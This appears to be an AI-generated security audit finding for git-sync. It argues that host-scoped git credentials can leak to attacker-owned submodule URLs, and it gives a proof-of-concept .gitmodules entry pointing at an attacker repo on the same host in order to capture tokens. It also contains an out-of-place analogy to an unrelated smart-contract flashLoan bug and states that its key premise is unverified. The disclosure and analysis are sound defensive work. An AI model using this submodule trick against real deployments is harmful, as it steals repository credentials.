### Title
Credentials stored for the main repo URL can be replayed to attacker-controlled submodule URLs on the same host due to git's host-level (not path-level) credential matching - (File: `main.go`)

### Summary
`git-sync` stores authentication material (GitHub App installation tokens, `--askpass-url` responses, and static passwords) via `StoreCredentials()`, which calls `git credential approve` keyed only to the top-level `--repo` URL. When `--submodules` is left at its default value of `recursive`, `git-sync` will recurse into submodules whose URLs come from `.gitmodules` — content that is part of the untrusted, attacker-influenced synced repository. Because Git's credential subsystem matches stored credentials by protocol+host by default (path is ignored unless `credential.useHttpPath` is explicitly configured), a submodule URL under the *same host* as the main repo — but a different, attacker-controlled path — will receive the same credential (password or GitHub App token) that was approved for the main repo.

### Finding Description
`StoreCredentials` approves credentials scoped to a caller-supplied URL string, not to a specific path-restricted credential: [1](#0-0) 

This is called from three places, all of which key the stored credential to the top-level `git.repo` value (not to any specific submodule path):

- `CallAskPassURL`, which stores whatever username/password the `--askpass-url` endpoint returns against `git.repo`: [2](#0-1) 

- `RefreshGitHubAppToken`, which stores the short-lived GitHub App installation token against `git.repo`: [3](#0-2) 

- The `--credential` flag path, which lets an operator pre-register credentials for specific submodule URLs, showing that git-sync's authors are aware that submodule URLs need distinct credential scoping in order to avoid exactly this kind of confusion: [4](#0-3) 

Submodule handling defaults to `recursive`, meaning `.gitmodules` content from the synced (potentially attacker-influenced) upstream repository is trusted to determine which additional remote URLs `git-sync` will authenticate against: [5](#0-4) 

The end-to-end test `e2e::submodule_sync_over_http_different_passwords` demonstrates that git-sync must be told about a *separate* credential per submodule URL via `--credential`, and confirms multiple `git credential approve` calls with different URLs coexist in the credential store: [6](#0-5) 

The core issue, analogous to the USD0 `flashLoan()` bug (where an allowance check validated approval against the wrong principal, `address(this)`, instead of the actual caller), is that the credential-storage/consumption flow validates trust at the wrong granularity: it authorizes based on "same host as `--repo`" rather than "the exact URL/path the credential owner intended." An attacker who can influence `.gitmodules` in the synced repository (e.g., by opening a PR/pushing a branch that is synced, or by controlling a repo that is submodule-referenced) can add a submodule pointing to a different, attacker-owned path on the same Git host (relevant for self-hosted multi-tenant Git servers, e.g., GitLab/Gitea instances where any user can host a project under the same domain). When `git-sync` performs `git submodule update --recursive`, Git's credential helper will match and transmit the main repo's GitHub App token or password to that attacker path, and the attacker's server (or a hook associated with the attacker-owned project) can log the Authorization header/Basic-Auth credentials.

### Impact Explanation
If successful, this results in disclosure of the GitHub App installation token or the password credential configured via `--askpass-url`/`--credential`, which is a listed acceptable impact ("credential or token disclosure"). Since these tokens/passwords typically grant read (and depending on GitHub App scope, sometimes broader) access to the source repository, exfiltration of them is a meaningful compromise of the sync pipeline's credentials.

### Likelihood Explanation
This requires:
1. `--submodules` at the default `recursive` setting (or explicitly enabled).
2. The main repo's Git host to be a *multi-tenant* server where an attacker can create/control a URL/path under the same host (e.g., a self-hosted GitLab/Gitea instance, or an internal Git server), OR the attacker being able to introduce a submodule reference to a URL under an existing shared domain.
3. Git's default `credential.useHttpPath=false` behavior remaining in effect for the relevant credential helper. I was **not able to confirm from the available code** whether `git-sync` explicitly sets `credential.useHttpPath` anywhere in its configuration setup, which would mitigate this by scoping credential matching to the exact path. This is a material gap in my verification — if git-sync (or the container's default git config) sets `credential.useHttpPath=true`, the impact described here would not manifest, since Git would then require an exact URL/path match before releasing the credential.

Given that gap, likelihood is best characterized as **conditional/plausible but unconfirmed** rather than proven, since real exploitation additionally depends on operational deployment specifics (shared-host Git server, GitHub App scope, or a password-based auth flow with submodules on the same host).

### Recommendation
- Explicitly set `credential.useHttpPath=true` (or scope credentials using `http.<url>.extraheader`/per-URL config sections) when storing dynamically-fetched credentials (`CallAskPassURL`, `RefreshGitHubAppToken`) so that they are only released for the exact repo URL/path, not any path under the same host.
- When `--submodules` is enabled, avoid relying on the main repo's broadly-scoped credential for submodule fetches; require operators to supply `--credential` entries per submodule URL, and refuse to authenticate submodule fetches with the main repo's dynamically-obtained token unless the submodule URL is an exact match (or explicit prefix match) of the primary `--repo` URL.
- Consider warning/failing loudly when `submodules=recursive` is combined with `--askpass-url`/GitHub App auth and a submodule URL resolves to a different path on the same host as `--repo`.

### Proof of Concept
1. Deploy `git-sync` against a repo hosted on a multi-tenant Git server (e.g., `https://git.internal.example/team/main-repo`) using `--github-app-*` flags (or `--askpass-url`) for authentication, with default `--submodules=recursive`.
2. As an attacker with the ability to push a branch/PR that gets synced (or control of an already-referenced submodule), add to `.gitmodules`:
   ```
   [submodule "evil"]
     path = evil
     url = https://git.internal.example/attacker/capture-repo
   ```
   where `attacker/capture-repo` is a project the attacker controls on the same host (e.g., configured with a webhook or serving as an HTTP endpoint that logs Basic-Auth headers).
3. On the next sync, `git-sync` calls `RefreshGitHubAppToken`/`CallAskPassURL`, which invoke `StoreCredentials(ctx, git.repo, username, password)` [1](#0-0)  approving the token against `git.repo`'s host.
4. `git submodule update --recursive` triggers a fetch to `https://git.internal.example/attacker/capture-repo`; because Git's credential helper matches by host (absent `credential.useHttpPath=true`), it releases the main repo's token/password to this URL, which the attacker's project/logging captures.

**Note:** I could not conclusively verify from the indexed source whether git-sync sets `credential.useHttpPath`; this is the deciding factor for exploitability and should be confirmed by reviewing git-sync's full git-config setup (not fully visible in the indexed excerpts) — a live Devin session with full repository access would be needed to confirm this configuration detail with certainty.

```go
// StoreCredentials stores a username and password for later use.
func (git *repoSync) StoreCredentials(ctx context.Context, url, username, password string) error {
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}

	return nil
}
```
